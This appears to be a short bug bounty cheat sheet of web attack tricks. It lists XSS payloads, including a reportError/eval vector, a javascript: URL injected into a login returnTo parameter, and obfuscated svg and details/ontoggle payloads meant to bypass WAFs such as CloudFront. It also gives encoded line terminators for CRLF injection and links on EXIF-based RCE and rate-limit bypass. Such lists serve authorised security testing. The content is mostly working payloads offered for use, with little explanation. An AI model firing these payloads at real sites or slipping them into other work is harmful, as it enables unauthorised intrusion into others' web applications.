# General tips
changing Exif metadata of an image can lead to XSS, RCE ...  [learn more](https://gokulvinesh.medium.com/rce-xss-via-image-exif-metadata-dddf33dadb41).
# XSS
1-The new reportError() function enables a quite amusing XSS vector:
```
window.name='alert(1)'
reportError(name , enerror=eval)
```
2-If you see `returnTo=` in login url , add `javascript:alert(1)` and login > xss alert.<br>
3-Amazon CloudFront WAF sometimes can be easily bypassed with `<svg onload=(alert)(1)` instead of `<svg onload=alert(1)`<br>
4-Bypass Waf <br>
```
<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//
```
# Rate limit bypass
![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/Rate%20limit%20bypass.jpeg)
# Line terminators
For XSS / CRLF injection.<br>
🔹LF: %0A (\u000A)<br>
🔹VT: %0B (\u000B)<br>
🔹FF: %0C (\u000C)<br>
🔹CR: %0D (\u000D)<br>
🔹CR+LF: %0D%0A (\u000D\u000A)<br>
🔹NEL: %C2%85 (\u0085)<br>
🔹LS: %E2%80%A8 (\u2028)<br>
🔹PS: %E2%80%A9 (\u2029)<br>
